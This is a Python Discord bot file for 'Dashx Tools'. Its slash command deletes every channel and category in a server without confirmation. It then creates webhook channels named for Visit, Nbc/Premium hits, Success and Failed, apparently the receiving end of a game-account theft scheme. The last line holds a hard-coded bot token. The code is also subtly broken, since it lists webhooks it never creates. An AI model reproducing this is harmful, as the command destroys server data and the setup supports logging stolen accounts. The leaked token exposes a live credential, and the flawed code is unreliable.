from discord_slash import SlashCommand, SlashContext
from discord.ext import commands
import discord

bot = commands.Bot(command_prefix="!", intents=discord.Intents.default())
slash = SlashCommand(bot, sync_commands=True)

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Game(name="Powered by Dashx Enterprise"))

@slash.slash(name="cmd",
             description="Deletes channels & categories, creates new ones, and lists webhook URLs.")
async def cmd(ctx: SlashContext):
    # Delete existing channels and categories
    for category in ctx.guild.categories:
        await category.delete()
    for channel in ctx.guild.channels:
        await channel.delete()

    # Create new categories
    command_status_category = await ctx.guild.create_category("Command Status")
    webhook_apis_category = await ctx.guild.create_category("Webhook Apis")

    # Create new channels in respective categories
    webhook_channels = ["𝚅𝚒𝚜𝚒𝚝", "𝚄-𝙽𝚋𝚌", "𝚄-𝙿𝚛𝚎𝚖", "𝚅-𝙽𝚋𝚌", "𝚅-𝙿𝚛𝚎𝚖", "𝚂𝚞𝚌𝚌𝚎𝚜", "𝙵𝚊𝚒𝚕𝚎𝚍"]
    for channel_name in webhook_channels:
        channel = await ctx.guild.create_text_channel(channel_name, category=webhook_apis_category)

    # Get webhook URLs for each channel and send to the command status category
    embed = discord.Embed(title="Webhook List", description="Dashx Tools", color=discord.Color.blue())
    for channel in webhook_apis_category.channels:
        for webhook in await channel.webhooks():
            embed.add_field(name=f"**{channel.name}**", value=f"{webhook.url}\n{webhook.name}", inline=False)

    # Send the embed to the command status category
    webhook_list_channel = await command_status_category.create_text_channel("𝙸𝚗𝚏𝚘")
    await webhook_list_channel.send(embed=embed.set_footer(text="Dashx Tools"))

bot.run("MTIzMDgwNzUzNjUxNzUxNzQxNQ.G-aBde.9R691qhcTfMhRnuMa3e4L5fI3pGM90gqFYWyW4")
